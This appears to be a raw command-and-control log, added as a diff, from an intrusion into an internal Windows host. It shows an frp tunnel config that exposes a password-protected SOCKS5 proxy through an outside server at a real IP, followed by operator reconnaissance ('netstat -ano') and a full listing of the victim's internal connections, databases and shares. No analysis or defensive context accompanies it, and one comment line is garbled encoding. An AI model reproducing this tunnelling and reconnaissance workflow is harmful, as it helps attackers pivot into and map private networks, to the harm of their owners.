+12/21 18:17:34 UTC [output]
+received output:
+[common]
+# 鏈嶅姟绔疘P鍜岄毀閬撶鍙�
+server_addr = 8.134.80.227
+server_port = 7000
+tls_enable = true
+pool_count = 5
+
+
+[rrr10]
+type = tcp
+remote_port = 54444
+plugin = socks5
+plugin_user = s09
+plugin_passwd = s09
+use_encryption = true
+use_compression = true
+
+12/21 18:39:48 UTC [input] <s09> shell netstat -ano
+12/21 18:39:48 UTC [task] <T1059> Tasked beacon to run: netstat -ano
+12/21 18:40:06 UTC [checkin] host called home, sent: 43 bytes
+12/21 18:40:07 UTC [output]
+received output:
+
+活动连接
+
+  协议  本地地址          外部地址        状态           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4572
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       996
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4572
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:25901          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       572
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       764
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       644
+  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       756
+  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       2120
+  TCP    0.0.0.0:51111          0.0.0.0:0              LISTENING       2084
+  TCP    127.0.0.1:8005         0.0.0.0:0              LISTENING       4572
+  TCP    127.0.0.1:10000        0.0.0.0:0              LISTENING       1664
+  TCP    127.0.0.1:54530        0.0.0.0:0              LISTENING       3712
+  TCP    127.0.0.1:54533        0.0.0.0:0              LISTENING       3260
+  TCP    127.0.0.1:54533        127.0.0.1:57669        ESTABLISHED     3260
+  TCP    127.0.0.1:57669        127.0.0.1:54533        ESTABLISHED     1664
+  TCP    127.0.0.1:57671        127.0.0.1:57672        ESTABLISHED     3260
+  TCP    127.0.0.1:57672        127.0.0.1:57671        ESTABLISHED     3260
+  TCP    192.168.20.111:139     0.0.0.0:0              LISTENING       4
+  TCP    192.168.20.111:443     192.168.20.31:57610    CLOSE_WAIT      4572
+  TCP    192.168.20.111:50167   192.168.20.27:8080     FIN_WAIT_2      6588
+  TCP    192.168.20.111:50424   72.163.15.143:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:50938   192.168.20.27:8081     FIN_WAIT_2      6588
+  TCP    192.168.20.111:51111   192.168.20.111:56392   ESTABLISHED     2084
+  TCP    192.168.20.111:51722   72.163.15.143:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:52355   72.163.15.143:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:52601   192.168.20.27:8080     FIN_WAIT_2      3716
+  TCP    192.168.20.111:53380   72.163.15.143:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:53710   192.168.20.110:3306    ESTABLISHED     4572
+  TCP    192.168.20.111:54054   192.168.20.27:8081     FIN_WAIT_2      3716
+  TCP    192.168.20.111:54236   192.168.20.110:3306    ESTABLISHED     4572
+  TCP    192.168.20.111:54406   192.168.200.168:1433   ESTABLISHED     4572
+  TCP    192.168.20.111:54583   72.163.15.143:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:54760   8.134.80.227:7000      ESTABLISHED     6284
+  TCP    192.168.20.111:55216   173.36.127.25:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:55313   120.46.214.208:21114   ESTABLISHED     6284
+  TCP    192.168.20.111:55757   192.168.20.110:3306    ESTABLISHED     4572
+  TCP    192.168.20.111:55888   124.225.5.140:80       ESTABLISHED     4976
+  TCP    192.168.20.111:55970   14.215.57.216:443      CLOSE_WAIT      4976
+  TCP    192.168.20.111:56392   192.168.20.111:51111   ESTABLISHED     6284
+  TCP    192.168.20.111:57445   173.36.127.25:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:58089   173.36.127.25:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:58456   112.49.25.8:443        CLOSE_WAIT      6284
+  TCP    192.168.20.111:58814   192.168.20.205:8080    TIME_WAIT       0
+  TCP    192.168.20.111:58816   192.168.20.205:8080    TIME_WAIT       0
+  TCP    192.168.20.111:58817   192.168.20.205:8080    TIME_WAIT       0
+  TCP    192.168.20.111:58818   192.168.20.205:8080    TIME_WAIT       0
+  TCP    192.168.20.111:58936   52.184.216.226:443     TIME_WAIT       0
+  TCP    192.168.20.111:59549   8.134.80.227:443       SYN_SENT        3656
+  TCP    192.168.20.111:59550   192.168.0.8:80         SYN_SENT        6284
+  TCP    192.168.20.111:59551   113.240.75.249:443     ESTABLISHED     6284
+  TCP    192.168.20.111:60353   72.163.15.143:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:61003   173.36.127.25:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:63187   192.168.200.252:445    ESTABLISHED     4
+  TCP    192.168.20.111:63938   173.36.127.25:443      CLOSE_WAIT      4572
+  TCP    192.168.20.111:65211   173.36.127.25:443      CLOSE_WAIT      4572
+  TCP    [::]:80                [::]:0                 LISTENING       4572
+  TCP    [::]:135               [::]:0                 LISTENING       996
+  TCP    [::]:443               [::]:0                 LISTENING       4572
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:25901             [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       652
+  TCP    [::]:49153             [::]:0                 LISTENING       572
+  TCP    [::]:49154             [::]:0                 LISTENING       764
+  TCP    [::]:49155             [::]:0                 LISTENING       644
+  TCP    [::]:49156             [::]:0                 LISTENING       756
+  TCP    [::]:49157             [::]:0                 LISTENING       2120
+  TCP    [::]:51111             [::]:0                 LISTENING       2084
+  UDP    0.0.0.0:500            *:*                                    644
+  UDP    0.0.0.0:3702           *:*                                    1012
+  UDP    0.0.0.0:3702           *:*                                    1012
+  UDP    0.0.0.0:4500           *:*                                    644
+  UDP    0.0.0.0:5355           *:*                                    1100
+  UDP    0.0.0.0:62098          *:*                                    1012
+  UDP    127.0.0.1:40000        *:*                                    1664
+  UDP    192.168.20.111:137     *:*                                    4
+  UDP    192.168.20.111:138     *:*                                    4
+  UDP    [::]:500               *:*                                    644
+  UDP    [::]:3702              *:*                                    1012
+  UDP    [::]:3702              *:*                                    1012
+  UDP    [::]:4500              *:*                                    644
+  UDP    [::]:62099             *:*                                    1012
+
+
